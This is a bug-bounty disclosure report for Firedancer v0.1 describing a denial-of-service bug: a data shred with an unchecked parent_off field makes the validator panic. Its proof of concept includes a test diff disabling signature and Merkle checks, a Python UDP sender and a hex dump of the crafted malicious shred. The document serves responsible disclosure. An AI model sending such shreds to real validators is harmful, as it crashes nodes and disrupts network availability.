# Boost \_ Firedancer v0.1 34682 - \[Blockchain\_DLT - Medium] DoS in shreds validation

Submitted on Tue Aug 20 2024 20:21:43 GMT-0400 (Atlantic Standard Time) by @Swift77057 for [Boost | Firedancer v0.1](https://immunefi.com/bounty/firedancer-boost/)

Report ID: #34682

Report type: Blockchain/DLT

Report severity: Medium

Target: <https://github.com/firedancer-io/firedancer/tree/e60d9a6206efaceac65a5a2c3a9e387a79d1d096>

Impacts:

* Liveness issues that cause Firedancer v0.1 validators to crash or be unavailable

## Description

## Brief/Intro

This is similar to report 34501, where a check in the shred tile is missing that causes the solana-labs tile to crash.

## Vulnerability Details

Like in the previous report, I found another shred that causes a panic in `fd_ext_blockstore_insert_shreds`.

Basically, the `parent_off` field of a data shred is not checked by fd at all. Setting this field to a value higher than the shred's slot triggers an error here:

```
fn parent(&self) -> Result<Slot, Error> {
        let slot = self.common_header().slot;
        let parent_offset = self.data_header().parent_offset;
        if parent_offset == 0 && slot != 0 {
            return Err(Error::InvalidParentOffset {
                slot,
                parent_offset,
            });
        }
        slot.checked_sub(Slot::from(parent_offset))
            .ok_or(Error::InvalidParentOffset {
                slot,
                parent_offset,
            })
    }
```

This error then causes a panic due to the unwrap in `fd_ext_blockstore_insert_shreds`.

Note that this bug works, even if the flags check in previous report is fixed.

## Impact Details

DoS

## Proof of concept

## Proof of Concept

Apply the patch and send the malicious shred.

`patch2.diff`:

```
diff --git a/src/app/fdctl/run/tiles/fd_shred.c b/src/app/fdctl/run/tiles/fd_shred.c
index 193a4b3d9..a3a214a60 100644
--- a/src/app/fdctl/run/tiles/fd_shred.c
+++ b/src/app/fdctl/run/tiles/fd_shred.c
@@ -340,7 +340,7 @@ during_frag( void * _ctx,
        the next one.  From a higher level though, if we do get overrun,
        a bunch of shreds will never be transmitted, and we'll end up
        producing a block that never lands on chain. */
-    fd_fec_set_t * out = ctx->fec_sets + ctx->shredder_fec_set_idx;
+    //fd_fec_set_t * out = ctx->fec_sets + ctx->shredder_fec_set_idx;
 
     uchar const * dcache_entry = fd_chunk_to_laddr_const( ctx->poh_in_mem, chunk );
     if( FD_UNLIKELY( chunk<ctx->poh_in_chunk0 || chunk>ctx->poh_in_wmark ) || sz>FD_POH_SHRED_MTU ||
@@ -397,6 +397,7 @@ during_frag( void * _ctx,
 
     ctx->send_fec_set_idx = ULONG_MAX;
     if( FD_UNLIKELY( last_in_batch )) {
+#if 0
       if( FD_UNLIKELY( ctx->batch_cnt%ctx->round_robin_cnt==ctx->round_robin_id ) ) {
         /* If it's our turn, shred this batch */
         ulong batch_sz = sizeof(ulong)+ctx->pending_batch.pos;
@@ -418,7 +419,9 @@ during_frag( void * _ctx,
         fd_histf_sample( ctx->metrics->batch_sz,             batch_sz                          );
         fd_histf_sample( ctx->metrics->batch_microblock_cnt, ctx->pending_batch.microblock_cnt );
         fd_histf_sample( ctx->metrics->shredding_timing,     (ulong)shredding_timing           );
-      } else {
+      } else
+#endif
+      {
         /* If it's not our turn, update the indices for this slot */
         fd_shredder_skip_batch( ctx->shredder, sizeof(ulong)+ctx->pending_batch.pos, target_slot );
       }
@@ -534,8 +537,8 @@ after_frag( void *             _ctx,
     return;
   }
 
-  const ulong fanout = 200UL;
-  fd_shred_dest_idx_t _dests[ 200*(FD_REEDSOL_DATA_SHREDS_MAX+FD_REEDSOL_PARITY_SHREDS_MAX) ];
+  //const ulong fanout = 200UL;
+  //fd_shred_dest_idx_t _dests[ 200*(FD_REEDSOL_DATA_SHREDS_MAX+FD_REEDSOL_PARITY_SHREDS_MAX) ];
 
   if( FD_LIKELY( in_idx==NET_IN_IDX ) ) {
     uchar * shred_buffer    = ctx->shred_buffer;
@@ -562,14 +565,14 @@ after_frag( void *             _ctx,
 
     if( (rv==FD_FEC_RESOLVER_SHRED_OKAY) | (rv==FD_FEC_RESOLVER_SHRED_COMPLETES) ) {
       /* Relay this shred */
-      ulong fanout = 200UL;
-      ulong max_dest_cnt[1];
+      //ulong fanout = 200UL;
+      //ulong max_dest_cnt[1];
       fd_shred_dest_t * sdest = fd_stake_ci_get_sdest_for_slot( ctx->stake_ci, shred->slot );
       if( FD_UNLIKELY( !sdest ) ) return;
-      fd_shred_dest_idx_t * dests = fd_shred_dest_compute_children( sdest, &shred, 1UL, _dests, 1UL, fanout, fanout, max_dest_cnt );
-      if( FD_UNLIKELY( !dests ) ) return;
+      //fd_shred_dest_idx_t * dests = fd_shred_dest_compute_children( sdest, &shred, 1UL, _dests, 1UL, fanout, fanout, max_dest_cnt );
+      //if( FD_UNLIKELY( !dests ) ) return;
 
-      for( ulong j=0UL; j<*max_dest_cnt; j++ ) send_shred( ctx, *out_shred, sdest, dests[ j ], ctx->tsorig );
+      //for( ulong j=0UL; j<*max_dest_cnt; j++ ) send_shred( ctx, *out_shred, sdest, dests[ j ], ctx->tsorig );
     }
     if( FD_LIKELY( rv!=FD_FEC_RESOLVER_SHRED_COMPLETES ) ) return;
 
@@ -625,6 +628,7 @@ after_frag( void *             _ctx,
   fd_shred_dest_t * sdest = fd_stake_ci_get_sdest_for_slot( ctx->stake_ci, new_shreds[ 0 ]->slot );
   if( FD_UNLIKELY( !sdest ) ) return;
 
+#if 0
   ulong out_stride;
   ulong max_dest_cnt[1];
   fd_shred_dest_idx_t * dests;
@@ -640,6 +644,7 @@ after_frag( void *             _ctx,
 
   /* Send only the ones we didn't receive. */
   for( ulong i=0UL; i<k; i++ ) for( ulong j=0UL; j<*max_dest_cnt; j++ ) send_shred( ctx, new_shreds[ i ], sdest, dests[ j*out_stride+i ], ctx->tsorig );
+#endif
 }
 
 static void
diff --git a/src/app/fdctl/run/tiles/fd_store.c b/src/app/fdctl/run/tiles/fd_store.c
index bcdf3b7ef..9ab7bb16e 100644
--- a/src/app/fdctl/run/tiles/fd_store.c
+++ b/src/app/fdctl/run/tiles/fd_store.c
@@ -104,6 +104,16 @@ after_frag( void *             _ctx,
     FD_TEST( shred34->stride==sizeof(shred34->pkts[0]) );
   }
 
+  if (shred34->shred_cnt == 1) {
+    fd_shred_t *shred = (fd_shred_t*)(ctx->mem+shred34->offset);
+    uchar variant    = shred->variant;
+    uchar shred_type = fd_shred_type( variant );
+    int is_data_shred = fd_shred_is_data( shred_type );
+    if (is_data_shred && shred->data.parent_off > shred->slot) {
+      FD_LOG_WARNING(("detected malicious shred"));
+    }
+  }
+
   /* No error code because this cannot fail. */
   fd_ext_blockstore_insert_shreds( fd_ext_blockstore, shred34->shred_cnt, ctx->mem+shred34->offset, shred34->shred_sz, shred34->stride, !!*opt_sig );
 
diff --git a/src/ballet/bmtree/fd_bmtree.c b/src/ballet/bmtree/fd_bmtree.c
index 1a2027427..03df3190e 100644
--- a/src/ballet/bmtree/fd_bmtree.c
+++ b/src/ballet/bmtree/fd_bmtree.c
@@ -399,10 +399,10 @@ fd_bmtree_commitp_insert_with_proof( fd_bmtree_commit_t *     state,
   ulong layer=0UL;
   for( ; layer<proof_depth; layer++ ) {
     ulong sibling_idx = inc_idx ^ (2UL<<layer);
-    if( FD_UNLIKELY( HAS(sibling_idx) && !fd_memeq( proof+hash_sz*layer, state->inclusion_proofs[sibling_idx].hash, hash_sz ) ) )
-      return 0;
-    if( FD_UNLIKELY( HAS(inc_idx) && !fd_memeq( state->node_buf[layer].hash, state->inclusion_proofs[ inc_idx ].hash, hash_sz ) ) )
-      return 0;
+    //if( FD_UNLIKELY( HAS(sibling_idx) && !fd_memeq( proof+hash_sz*layer, state->inclusion_proofs[sibling_idx].hash, hash_sz ) ) )
+      //return 0;
+    //if( FD_UNLIKELY( HAS(inc_idx) && !fd_memeq( state->node_buf[layer].hash, state->inclusion_proofs[ inc_idx ].hash, hash_sz ) ) )
+      //return 0;
 
     ulong parent_idx = fd_ulong_insert_lsb( inc_idx, (int)layer+2, (2UL<<layer)-1UL );
 
@@ -432,9 +432,9 @@ fd_bmtree_commitp_insert_with_proof( fd_bmtree_commit_t *     state,
     inc_idx = fd_ulong_insert_lsb( inc_idx, (int)layer+2, (2UL<<layer)-1UL );
   }
   /* TODO: Prove inc_idx < inclusion_proof_sz at this point */
-  if( FD_UNLIKELY( HAS(inc_idx) &&
-        !fd_memeq( state->node_buf[layer].hash, state->inclusion_proofs[ inc_idx ].hash, state->hash_sz ) ) )
-    return 0;
+  //if( FD_UNLIKELY( HAS(inc_idx) &&
+  //      !fd_memeq( state->node_buf[layer].hash, state->inclusion_proofs[ inc_idx ].hash, state->hash_sz ) ) )
+  //  return 0;
 
   /* Cache the nodes from the main branch */
   inc_idx = 2UL * idx;
diff --git a/src/disco/shred/fd_fec_resolver.c b/src/disco/shred/fd_fec_resolver.c
index b2b9b55b8..2ffa1e1d2 100644
--- a/src/disco/shred/fd_fec_resolver.c
+++ b/src/disco/shred/fd_fec_resolver.c
@@ -333,11 +333,13 @@ int fd_fec_resolver_add_shred( fd_fec_resolver_t    * resolver,
   wrapped_sig_t * w_sig = (wrapped_sig_t *)shred->signature;
 
   /* Immediately reject any shred with a 0 signature. */
-  if( FD_UNLIKELY( ctx_map_key_inval( *w_sig ) ) ) return FD_FEC_RESOLVER_SHRED_REJECTED;
+  //if( FD_UNLIKELY( ctx_map_key_inval( *w_sig ) ) ) return FD_FEC_RESOLVER_SHRED_REJECTED;
 
   /* Are we already done with this FEC set? */
   int found = !!ctx_map_query( done_map, *w_sig, NULL );
 
+  FD_LOG_WARNING(("ok1"));
+
   if( found )  return FD_FEC_RESOLVER_SHRED_IGNORED; /* With no packet loss, we expect found==1 about 50% of the time */
 
   set_ctx_t * ctx = ctx_map_query( curr_map, *w_sig, NULL );
@@ -351,7 +353,7 @@ int fd_fec_resolver_add_shred( fd_fec_resolver_t    * resolver,
     return FD_FEC_RESOLVER_SHRED_REJECTED;
   }
 
-  if( FD_UNLIKELY( shred->version!=resolver->expected_shred_version ) ) return FD_FEC_RESOLVER_SHRED_REJECTED;
+  //if( FD_UNLIKELY( shred->version!=resolver->expected_shred_version ) ) return FD_FEC_RESOLVER_SHRED_REJECTED;
 
   int is_data_shred = fd_shred_is_data( shred_type );
 
@@ -361,6 +363,8 @@ int fd_fec_resolver_add_shred( fd_fec_resolver_t    * resolver,
     if( FD_UNLIKELY( (shred->code.data_cnt==0UL) | (shred->code.code_cnt==0UL) ) ) return FD_FEC_RESOLVER_SHRED_REJECTED;
   }
 
+  FD_LOG_WARNING(("ok2"));
+
   /* For the purposes of the shred header, tree_depth means the number
      of nodes, counting the leaf but excluding the root.  For bmtree,
      depth means the number of layers, which counts both. */
@@ -402,7 +406,7 @@ int fd_fec_resolver_add_shred( fd_fec_resolver_t    * resolver,
 
       /* Add this one that we're sacrificing to the done map to
          prevent the possibility of thrashing. */
-      ctx_ll_insert( done_ll_sentinel, ctx_map_insert( done_map, victim_ctx->sig ) );
+      //ctx_ll_insert( done_ll_sentinel, ctx_map_insert( done_map, victim_ctx->sig ) );
       if( FD_UNLIKELY( ctx_map_key_cnt( done_map ) > done_depth ) ) ctx_map_remove( done_map, ctx_ll_remove( done_ll_sentinel->prev ) );
 
       freelist_push_tail( free_list,        victim_ctx->set  );
@@ -423,7 +427,7 @@ int fd_fec_resolver_add_shred( fd_fec_resolver_t    * resolver,
        shreds. */
     fd_bmtree_commit_t * tree;
     tree = fd_bmtree_commit_init( bmtree_mem, FD_SHRED_MERKLE_NODE_SZ, FD_BMTREE_LONG_PREFIX_SZ, INCLUSION_PROOF_LAYERS );
-
+FD_LOG_WARNING(("ok3"));
     fd_bmtree_node_t _root[1];
     fd_shred_merkle_t const * proof = fd_shred_merkle_nodes( shred );
     int rv = fd_bmtree_commitp_insert_with_proof( tree, shred_idx, leaf, (uchar const *)proof, tree_depth, _root );
@@ -433,14 +437,16 @@ int fd_fec_resolver_add_shred( fd_fec_resolver_t    * resolver,
       FD_MCNT_INC( SHRED, SHRED_REJECTED_INITIAL, 1UL );
       return FD_FEC_RESOLVER_SHRED_REJECTED;
     }
-
+    (void) leader_pubkey;
+    (void) sha512;
+#if 0
     if( FD_UNLIKELY( FD_ED25519_SUCCESS != fd_ed25519_verify( _root->hash, 32UL, shred->signature, leader_pubkey, sha512 ) ) ) {
       freelist_push_head( free_list,        set_to_use );
       bmtrlist_push_head( bmtree_free_list, bmtree_mem );
       FD_MCNT_INC( SHRED, SHRED_REJECTED_INITIAL, 1UL );
       return FD_FEC_RESOLVER_SHRED_REJECTED;
     }
-
+#endif
     /* This seems like a legitimate FEC set, so we can reserve some
        resources for it. */
     ctx = ctx_ll_insert( curr_ll_sentinel, ctx_map_insert( curr_map, *w_sig ) );
@@ -455,6 +461,7 @@ int fd_fec_resolver_add_shred( fd_fec_resolver_t    * resolver,
     } else {
       fd_memset( ctx->retransmitter_sig.u, 0, 64UL );
     }
+    FD_LOG_WARNING(("ok4"));
 
     /* Reset the FEC set */
     ctx->set->data_shred_cnt   = SHRED_CNT_NOT_SET;
@@ -522,9 +529,9 @@ int fd_fec_resolver_add_shred( fd_fec_resolver_t    * resolver,
   uchar                 parity_variant = ctx->parity_variant;
   uchar                 data_variant   = ctx->data_variant;
 
-  ctx_ll_insert( done_ll_sentinel, ctx_map_insert( done_map, ctx->sig ) );
+  //ctx_ll_insert( done_ll_sentinel, ctx_map_insert( done_map, ctx->sig ) );
   if( FD_UNLIKELY( ctx_map_key_cnt( done_map ) > done_depth ) ) ctx_map_remove( done_map, ctx_ll_remove( done_ll_sentinel->prev ) );
-
+FD_LOG_WARNING(("ok5"));
   ctx_map_remove( curr_map, ctx_ll_remove( ctx ) );
 
   reedsol = fd_reedsol_recover_init( (void*)reedsol, reedsol_protected_sz );
@@ -551,7 +558,7 @@ int fd_fec_resolver_add_shred( fd_fec_resolver_t    * resolver,
     FD_MCNT_INC( SHRED, FEC_REJECTED_FATAL, 1UL );
     return FD_FEC_RESOLVER_SHRED_REJECTED;
   }
-
+FD_LOG_WARNING(("ok6"));
   uchar const * chained_root = fd_ptr_if( fd_shred_is_chained( shred_type ), (uchar *)shred+fd_shred_chain_offset( variant ), NULL );
 
   /* Iterate over recovered shreds, add them to the Merkle tree,
@@ -572,7 +579,7 @@ int fd_fec_resolver_add_shred( fd_fec_resolver_t    * resolver,
 
     }
   }
-
+FD_LOG_WARNING(("ok7"));
   for( ulong i=0UL; i<set->parity_shred_cnt; i++ ) {
     if( !p_rcvd_test( set->parity_shred_rcvd, i ) ) {
       fd_shred_t * p_shred = (fd_shred_t *)set->parity_shreds[i]; /* We can't parse because we haven't populated the header */
@@ -599,7 +606,7 @@ int fd_fec_resolver_add_shred( fd_fec_resolver_t    * resolver,
       }
     }
   }
-
+FD_LOG_WARNING(("ok8"));
   /* Check that the whole Merkle tree is consistent. */
   if( FD_UNLIKELY( !fd_bmtree_commitp_fini( tree, set->data_shred_cnt + set->parity_shred_cnt ) ) ) {
     freelist_push_tail( free_list,        set  );
@@ -613,7 +620,7 @@ int fd_fec_resolver_add_shred( fd_fec_resolver_t    * resolver,
   fd_shred_t const * base_data_shred   = fd_shred_parse( set->data_shreds  [ 0 ], FD_SHRED_MIN_SZ );
   fd_shred_t const * base_parity_shred = fd_shred_parse( set->parity_shreds[ 0 ], FD_SHRED_MAX_SZ );
   int reject = (!base_data_shred) | (!base_parity_shred);
-
+FD_LOG_WARNING(("ok9"));
   for( ulong i=1UL; (!reject) & (i<set->data_shred_cnt); i++ ) {
     /* Technically, we only need to re-parse the ones we recovered with
        Reedsol, but parsing is pretty cheap and the rest of the
@@ -646,6 +653,7 @@ int fd_fec_resolver_add_shred( fd_fec_resolver_t    * resolver,
                 !fd_memeq( (uchar *)parsed         +fd_shred_chain_offset( parsed->variant          ),
                            (uchar *)base_data_shred+fd_shred_chain_offset( base_data_shred->variant ), FD_SHRED_MERKLE_ROOT_SZ );
   }
+  FD_LOG_WARNING(("ok10"));
   if( FD_UNLIKELY( reject ) ) {
     freelist_push_tail( free_list,        set  );
     bmtrlist_push_tail( bmtree_free_list, tree );
@@ -674,6 +682,7 @@ int fd_fec_resolver_add_shred( fd_fec_resolver_t    * resolver,
   freelist_push_tail( complete_list, set );
   freelist_push_tail( free_list, freelist_pop_head( complete_list ) );
 
+  FD_LOG_WARNING(("complete"));
   *out_fec_set = set;
 
   return FD_FEC_RESOLVER_SHRED_COMPLETES;
```

`send_shred.py`

```
import socket
import os

# IP address and port
UDP_IP = "192.168.178.25"
UDP_PORT = 8003

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print('[!] Sending shred...')

with open('shred2.bin', mode='rb') as f:
    data = f.read()
    sock.sendto(data, (UDP_IP, UDP_PORT))
```

xxd `shred2.bin`

```
00000000: 0200 0000 0000 0000 0000 0000 0000 0000  ................
00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000040: 6500 0000 0000 0000 00ff ffff ff00 00ff  e...............
00000050: ffff ff01 002f 0015 0095 0000 0000 0000  ...../..........
00000060: 0000 2000 0000 0000 ffff ffff 5e5e 5e5e  .. .........^^^^
00000070: 00e7 ffff ff00 0000 0000 adad 8888 8888  ................
00000080: 8888 8888 8888 8888 8888 88ff ffc5 c5c5  ................
00000090: c5c5 c5c5 c5c5 c5c5 c5c5 c5c5 c501 0000  ................
000000a0: 0000 0000 6cc5 c5c5 c5c5 c5c5 c5c5 c5c5  ....l...........
000000b0: c5c5 c5c5 c5c5 c5c5 c5c5 c5c5 c5c5 c5c5  ................
000000c0: c5c5 c5c5 c5c5 c5c5 c5c5 c5c5 c5c5 c5c5  ................
000000d0: ffff ffff 015a 8888 8888 8888 8888 8888  .....Z..........
000000e0: 8888 8888 8888 8888 8888 ff00 ffff ffff  ................
000000f0: ffff 0000 0000 0000 0000 0091 9191 91ff  ................
00000100: ffff ffff ffff ffff ffff ffbb 0a91 0000  ................
00000110: 0000 4800 0091 915e 5e5e 5e5e 5e5e 5e5e  ..H....^^^^^^^^^
00000120: 5e0e 7c96 cf5f 87e1 4131 666c 966f f4db  ^.|.._..A1fl.o..
00000130: b293 fcdb e1ff 0e7c 96cf 5f87 e141 3466  .......|.._..A4f
00000140: 6c96 6ff4 dbb2 93fc dbe1 ffff ffff ffff  l.o.............
00000150: ffff ffff ffff ffff ffff ffff ffff 0000  ................
00000160: 0000 0000 0070 0a91 0000 0000 4800 0091  .....p......H...
00000170: 915c 5e5e 5e5e 5e5e 5e5e 5e5e 5e5e 5e5e  .\^^^^^^^^^^^^^^
00000180: 5e5e 5e5e 5e5e 5e5e 5e70 7070 7070 7070  ^^^^^^^^^ppppppp
00000190: 7070 7070 7070 7070 7070 7070 7070 7070  pppppppppppppppp
000001a0: 7070 7070 7070 4970 7070 70ff ffff ffff  ppppppIpppp.....
000001b0: ffff ff01 0027 0020 0000 0000 0000 0000  .....'. ........
000001c0: 0000 0000 000a 9100 0000 0048 0000 9191  ...........H....
000001d0: 5e5e 5e5e 5e5e 5e5e 5e5e 5e5e 5e5e 5e5e  ^^^^^^^^^^^^^^^^
000001e0: 5ebb 0400 005e 5e5e 5e5e 5e5e 5e5e 5e5e  ^....^^^^^^^^^^^
000001f0: 5e5e 5ea2 8f8f 8f8f 8f8f 9570 7070 7070  ^^^........ppppp
00000200: 7070 7046 7070 70bf bfbf bfbf bfbf bfbf  pppFppp.........
00000210: bfbf bfbf bfbf bfbf bfbf bfbf bfbf bfbf  ................
00000220: bfbf bfbf bfbf bfbf bfbf bfff ffff ffff  ................
00000230: ffff ff01 0000 0000 0000 58ff ffff ffff  ..........X.....
00000240: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000250: 0000 0058 ffff ffff ffff ffff ffff ffff  ...X............
00000260: ffff ffff ffff ffff ffff ffff ffff ff00  ................
00000270: 0000 0000 0009 ddff ffff ffff ffff ffff  ................
00000280: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000290: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000002a0: ffff ffff bfff ffff ffff ffff 9191 9191  ................
000002b0: 2591 916f 0000 0000 0000 ffff ffff 9191  %..o............
000002c0: 0000 0b91 0000 0000 0000 0000 3c00 0000  ............<...
000002d0: 0000 0000 5e5e 5e5e 5e5e 5e5e 5e5e 5e5a  ....^^^^^^^^^^^Z
000002e0: 5e5e 5e5e 5e5e 5e5e 5e5e 5e56 5e5e 5e5e  ^^^^^^^^^^^V^^^^
000002f0: 5e5e 5e5e 5e5e 5e8a 9191 9191 9191 9191  ^^^^^^^.........
00000300: 01bb 0a90 ffff fffe 4800 0091 5e5e 5e5e  ........H...^^^^
00000310: 915e 5e5e 5e5e 5e5e 5e5e 00e7 91da ffff  .^^^^^^^^^......
00000320: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000330: ffff ffff ffff 9191 9191 9191 2591 916f  ............%..o
00000340: 0000 0000 4f00 0091 9191 91ff ffff ffff  ....O...........
00000350: ffff 91da 9191 9191 9191 2591 916f 0000  ..........%..o..
00000360: 0000 0000 9191 9191 ffff ff0e 7c96 cf5f  ............|.._
00000370: 87e1 4138 666c 966f f4db b293 fcdb e1ff  ..A8fl.o........
00000380: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000390: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000003a0: ffff ffff ffff ffff 70c3 0500 0000 0000  ........p.......
000003b0: 0070 7070 705e 5e5e 5e5e 0000 0000 0000  .pppp^^^^^......
000003c0: 0000 0000 0000 0000 0000 0000 0000 ff00  ................
000003d0: 0000 5e5e 5e5e 5e5e 5e5e 5e5e 5e5e 5e5e  ..^^^^^^^^^^^^^^
000003e0: 5e5e 5e5e 5e5e 5e5e 5e5e 6b6b 6b6b 6b6b  ^^^^^^^^^^kkkkkk
000003f0: 6b6b 6b6b 6b6b 3d6b 6b6b 6b6b 6b6b 6b6b  kkkkkk=kkkkkkkkk
00000400: 6b6b 6b6b 6b6b 6b6b 6b6b 6b6b 6b6b 0000  kkkkkkkkkkkkkk..
00000410: 0005 3200 0000 0000 0000 0000 0000 0000  ..2.............
00000420: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000430: 0000 0000 0000 ffff ffff ffdf ffff ffff  ................
00000440: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000450: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000460: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000470: ffff ffff ffff ffff ffcd cdcd cdcd cdcd  ................
00000480: cdcd cdcd ff00 0000 0000 adad adad adad  ................
00000490: adad adff ffff ffcd cdcd cdcd cdcd cdff  ................
000004a0: ff00 0000 0000 0000 0000 cdcd cdcd cdcd  ................
000004b0: cdcd cdcd cdcd cdcd cdcd cdcd cdcd cdcd  ................
000004c0: cdcd cdcd cdcd cdcd cdcd cdcd cdcd cdcd  ................
000004d0: cdcd cdcd cd91 9191 91ff ffff cdcd cdcd  ................
000004e0: cdcd cdcd                                ....
```
